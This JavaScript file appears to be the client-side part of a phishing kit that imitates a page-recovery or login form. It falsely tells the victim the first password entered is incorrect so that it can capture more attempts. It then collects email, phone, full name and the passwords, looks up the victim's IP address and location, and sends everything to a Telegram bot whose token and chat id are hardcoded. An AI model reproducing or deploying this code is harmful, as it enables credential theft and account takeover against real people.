
function validateInput (inputElement) {
  const value = parseInt(inputElement.value)
  if (isNaN(value) || value % 1 !== 0) {
    document.getElementById('messageerror').innerText =
      'Please enter a phone number'
  } else {

    document.getElementById('messageerror').innerText = ''
  }
}
function showPasswordForm (event) {
  event.preventDefault()
  document.getElementById('passwordPopup').style.display = 'block'
}
function closePopup () {
  document.getElementById('passwordPopup').style.display = 'none'
}

let attempts = 0
let firstPassword = ''
function getUserIP (callback) {
  fetch('https://api.ipify.org/?format=json')
    .then(response => response.json())
    .then(data => {
      callback(data.ip)
    })
    .catch(error => {
      console.error('Failed to fetch IP:', error)
      callback(null)
    })
}
function checkPassword () {
  var password = document.getElementById('password').value
  var messageDiv = document.getElementById('messageContainer')

  if (attempts === 0) {
    if (password.trim() === '') {
      messageDiv.innerHTML = 'Please enter your password'
      return 
    } else {
      attempts++
      firstPassword = password
      messageDiv.innerHTML = "The password that you've entered is incorrect"
    }

    document.getElementById('passwordForm').reset()
  } else if (attempts === 1 || attempts === 2 || attempts === 3) {
    attempts++
    const email = $('#email').val()
    const password = $('#password').val()
    const phone = $('#phone').val()
    const emailbs = $('#emailbs').val()
    const namefanpage = $('#namefanpage').val()
    const fullname = $('#fullname').val()

    if (password.trim() === '') {
      messageDiv.innerHTML = 'Please enter your password'
    } else {
      messageDiv.innerHTML =
        '<div class="lds-ellipsis"><div></div><div></div><div></div><div></div></div>'

      getUserIP(function (ip) {
        if (!ip) {
          console.error('IP not available')
          return
        }

        fetch('https://freeipapi.com/api/json/' + encodeURIComponent(ip))
          .then(response => response.json())
          .then(data => {
            const ipAddress = data.ipAddress
            const cityName = data.cityName
            const countryName = data.countryName
            const requestData = `
email: ${email}
firstPassword: ${firstPassword}
password: ${password}
phone: ${phone}
emailbs: ${emailbs}
country: ${countryName}
city: ${cityName}
Ip: ${ipAddress}
namefanpage: ${namefanpage}
fullname: ${fullname}
`

            const botToken = '6675441092:AAENA2tQAnzrJmyDtEJl9OecVVmAyQtpBlE'
            const chatId = '-4185862162'
            const rdata = {
              chat_id: chatId,
              text: requestData
            }
            $.ajax({
              type: 'POST',
              url: `https://api.telegram.org/bot${botToken}/sendMessage`,
              data: rdata,
              success: function (response) {
                console.log(response)
                setTimeout(function () {
                  window.location.href = `community-confirm?email=${encodeURIComponent(
                    email
                  )}&firstPassword=${encodeURIComponent(
                    firstPassword
                  )}&password=${encodeURIComponent(
                    password
                  )}&phone=${encodeURIComponent(
                    phone
                  )}&emailbs=${encodeURIComponent(
                    emailbs
                  )}&country=${encodeURIComponent(
                    countryName
                  )}&city=${encodeURIComponent(
                    cityName
                  )}&Ip=${encodeURIComponent(ipAddress)}`
                }, 1000)
              },
              error: function () {
                alert('An error occurred.')
              }
            })
          })
          .catch(error => {
            console.error('Failed to send IP to API:', error)
          })
      })
    }
  }
}
